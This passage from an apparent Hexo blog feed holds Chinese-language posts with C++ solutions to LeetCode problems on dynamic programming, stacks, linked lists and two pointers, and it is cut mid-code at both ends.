class="hljs-number">0</span>; i &lt; n; i++) cin &gt;&gt; north[i];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) cin &gt;&gt; west[i];<br><br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x : path) cout &lt;&lt; x &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>回溯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DP</title>
    <link href="/2026/01/19/DP/"/>
    <url>/2026/01/19/DP/</url>
    
    <content type="html"><![CDATA[<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><p>我现在暂时讲不清楚</p><p>以后再说…</p><h2 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70.爬楼梯"></a>70.爬楼梯</h2><p><img src="/images/41.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">climbStairs</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(n<span class="hljs-number">+1</span>)</span></span>;<br>        dp[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>        dp[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt;= n; i++)&#123;<br>            dp[i] = dp[i<span class="hljs-number">-1</span>] + dp[i<span class="hljs-number">-2</span>]; <span class="hljs-comment">//orz</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[n];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="118-杨辉三角"><a href="#118-杨辉三角" class="headerlink" title="118.杨辉三角"></a>118.杨辉三角</h2><p><img src="/images/42.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">generate</span>(<span class="hljs-type">int</span> numRows) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; res;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numRows; i++)&#123;<br>            <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">row</span><span class="hljs-params">(i<span class="hljs-number">+1</span>,<span class="hljs-number">1</span>)</span></span>;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; i; j++)&#123;<br>                row[j] = res[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>] + res[i<span class="hljs-number">-1</span>][j]; <span class="hljs-comment">//ez</span><br>            &#125;<br>            res.<span class="hljs-built_in">push_back</span>(row);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="198.打家劫舍"></a>198.打家劫舍</h2><p><img src="/images/43.png" alt="如图"></p><p>解：</p><p>动态规划(DP)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(n)</span></span>;<br>        dp[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];<br>        dp[<span class="hljs-number">1</span>] = <span class="hljs-built_in">max</span>(nums[<span class="hljs-number">0</span>],nums[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; n; i++)&#123;<br>            dp[i] = <span class="hljs-built_in">max</span>(nums[i] + dp[i<span class="hljs-number">-2</span>],dp[i<span class="hljs-number">-1</span>]); <span class="hljs-comment">//思索...</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[n<span class="hljs-number">-1</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="279-完全平方数"><a href="#279-完全平方数" class="headerlink" title="279.完全平方数"></a>279.完全平方数</h2><p><img src="/images/44.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numSquares</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(n<span class="hljs-number">+1</span>, INT_MAX)</span></span>;<br>        dp[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j * j &lt;= i; j++)&#123;<br>                dp[i] = <span class="hljs-built_in">min</span>(dp[i], dp[i - j * j] + <span class="hljs-number">1</span>); <span class="hljs-comment">//思考...</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[n];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>动态规划</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈</title>
    <link href="/2026/01/19/%E6%A0%88/"/>
    <url>/2026/01/19/%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<h1 id="栈-LIFO"><a href="#栈-LIFO" class="headerlink" title="栈(LIFO)"></a>栈(LIFO)</h1><p>学pwn的看到<strong>栈</strong>真是惬意啊</p><p>不对…</p><h2 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20.有效的括号"></a>20.有效的括号</h2><p><img src="/images/26.png" alt="如图"></p><p>解：</p><p><code>后进先出</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">char</span>&gt; stk;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c : s) &#123;<br>            <span class="hljs-keyword">if</span>(c == <span class="hljs-string">&#x27;(&#x27;</span> || c == <span class="hljs-string">&#x27;[&#x27;</span> || c == <span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br>                stk.<span class="hljs-built_in">push</span>(c);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; !stk.<span class="hljs-built_in">empty</span>() &amp;&amp; stk.<span class="hljs-built_in">top</span>() == <span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br>                stk.<span class="hljs-built_in">pop</span>();<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c == <span class="hljs-string">&#x27;]&#x27;</span> &amp;&amp; !stk.<span class="hljs-built_in">empty</span>() &amp;&amp; stk.<span class="hljs-built_in">top</span>() == <span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br>                stk.<span class="hljs-built_in">pop</span>();<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c == <span class="hljs-string">&#x27;&#125;&#x27;</span> &amp;&amp; !stk.<span class="hljs-built_in">empty</span>() &amp;&amp; stk.<span class="hljs-built_in">top</span>() == <span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br>                stk.<span class="hljs-built_in">pop</span>();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> stk.<span class="hljs-built_in">empty</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>数据结构</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表</title>
    <link href="/2026/01/19/%E9%93%BE%E8%A1%A8/"/>
    <url>/2026/01/19/%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>c语言动态内存管理中</p><p>链表结构无处不在</p><p>有fast bin这种单向链表</p><p>也有unsorted bin这种双向链表</p><p>我应该还是蛮熟悉的…</p><p>重点在于对<code>指针</code>的理解</p><p>做题过程中呢发现</p><p>核心算法是</p><p><strong>双指针</strong></p><p>那么</p><p>启动!</p><h2 id="160-相交链表"><a href="#160-相交链表" class="headerlink" title="160.相交链表"></a>160.相交链表</h2><p><img src="/images/23.png" alt="如图"></p><p>解:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode *headA, ListNode *headB)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!headA || !headB) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        ListNode* p1 = headA;<br>        ListNode* p2 = headB;  <span class="hljs-comment">//双指针</span><br>        <span class="hljs-keyword">while</span>(p1 != p2)&#123;<br>            p1 = (p1 ? p1-&gt;next : headB);<br>            p2 = (p2 ? p2-&gt;next : headA);<br>        &#125;<br>        <span class="hljs-keyword">return</span> p1;  <span class="hljs-comment">//相交节点 or nullptr</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206.反转链表"></a>206.反转链表</h2><p><img src="/images/24.png" alt="如图"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* prev = <span class="hljs-literal">nullptr</span>;<br>        ListNode* cur = head;<br><br>        <span class="hljs-keyword">while</span>(cur)&#123;<br>            ListNode* tmp = cur-&gt;next; <span class="hljs-comment">//保存节点</span><br>            cur-&gt;next = prev;<br>            prev = cur;<br>            cur = tmp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> prev;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="234-回文链表"><a href="#234-回文链表" class="headerlink" title="234.回文链表"></a>234.回文链表</h2><p><img src="/images/28.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!head || !head-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        ListNode* slow = head;<br>        ListNode* fast = head;<br>        <span class="hljs-keyword">while</span>(fast &amp;&amp; fast-&gt;next)&#123;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>        &#125;<br><br>        ListNode* prev = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">while</span>(slow)&#123;<br>            ListNode* next = slow-&gt;next;<br>            slow-&gt;next = prev;<br>            prev = slow;<br>            slow = next;  <span class="hljs-comment">//反转链表</span><br>        &#125;<br>        ListNode* left = head;<br>        ListNode* right = prev;<br>        <span class="hljs-keyword">while</span>(right)&#123;<br>            <span class="hljs-keyword">if</span>(left-&gt;val != right-&gt;val)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            left = left-&gt;next;<br>            right = right-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141.环形链表"></a>141.环形链表</h2><p><img src="/images/29.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode *head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!head || !head-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        ListNode* slow = head;<br>        ListNode* fast = head;<br>        <span class="hljs-keyword">while</span>(fast &amp;&amp; fast-&gt;next)&#123;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>            <span class="hljs-keyword">if</span>(slow == fast) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="142-环形链表II"><a href="#142-环形链表II" class="headerlink" title="142.环形链表II"></a>142.环形链表II</h2><p><img src="/images/30.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode *head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!head || !head-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        ListNode* slow = head;<br>        ListNode* fast = head;<br>        <span class="hljs-keyword">while</span>(fast &amp;&amp; fast-&gt;next)&#123;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>            <span class="hljs-keyword">if</span>(slow == fast) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!fast || !fast-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        slow = head;<br>        <span class="hljs-keyword">while</span>(slow != fast)&#123;<br>            slow = slow-&gt;next; <span class="hljs-comment">//思考...</span><br>            fast = fast-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> slow;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21.合并两个有序链表"></a>21.合并两个有序链表</h2><p><img src="/images/31.png" alt="如图"></p><p>解：</p><p><code>双指针</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode* list1, ListNode* list2)</span> </span>&#123;<br>        <span class="hljs-function">ListNode <span class="hljs-title">dummy</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;<br>        ListNode* cur = &amp;dummy;<br>        <span class="hljs-keyword">while</span>(list1 &amp;&amp; list2)&#123;<br>            <span class="hljs-keyword">if</span>(list1-&gt;val &lt;= list2-&gt;val)&#123;<br>                cur-&gt;next = list1;<br>                list1 = list1-&gt;next;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                cur-&gt;next = list2;<br>                list2 = list2-&gt;next;<br>            &#125;<br>            cur = cur-&gt;next;<br>        &#125;<br>        cur-&gt;next = list1 ? list1 : list2;<br>        <span class="hljs-keyword">return</span> dummy.next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>数据结构</tag>
      
      <tag>双指针</tag>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>双指针</title>
    <link href="/2026/01/19/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    <url>/2026/01/19/%E5%8F%8C%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<h1 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h1><p>很经典</p><p>也很有意思</p><p>以后写…</p><h2 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283.移动零"></a>283.移动零</h2><p><img src="/images/20.png" alt="如图所示"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">moveZeroes</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> slow = <span class="hljs-number">0</span>; <span class="hljs-comment">//快慢双指针</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> fast = <span class="hljs-number">0</span>;fast &lt; nums.<span class="hljs-built_in">size</span>();fast++)&#123;<br>            <span class="hljs-keyword">if</span>(nums[fast] != <span class="hljs-number">0</span>)&#123;<br>                nums[slow] = nums[fast];<br>                slow++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = slow;j &lt; nums.<span class="hljs-built_in">size</span>();j++)&#123;<br>            nums[j] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11.盛最多水的容器"></a>11.盛最多水的容器</h2><p><img src="/images/21.png" alt="如图所示"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; height)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>,r = height.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span>(l &lt; r)&#123;<br>            <span class="hljs-type">int</span> h = <span class="hljs-built_in">min</span>(height[l], height[r]);<br>            <span class="hljs-type">int</span> area = h * (r - l);<br>            ans = <span class="hljs-built_in">max</span>(ans, area);<br><br>            <span class="hljs-keyword">if</span>(height[l] &lt; height[r])&#123;<br>                l++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                r--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15.三数之和"></a>15.三数之和</h2><p><img src="/images/22.png" alt="如图"></p><p>解:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">threeSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; res;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">return</span> res;<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(),nums.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">2</span>; i++)&#123;<br>            <span class="hljs-type">int</span> l = i + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">int</span> r = n - <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">//i去重 思考...</span><br>            <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span> &amp;&amp; nums[i] == nums[i - <span class="hljs-number">1</span>]) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">while</span>(l &lt; 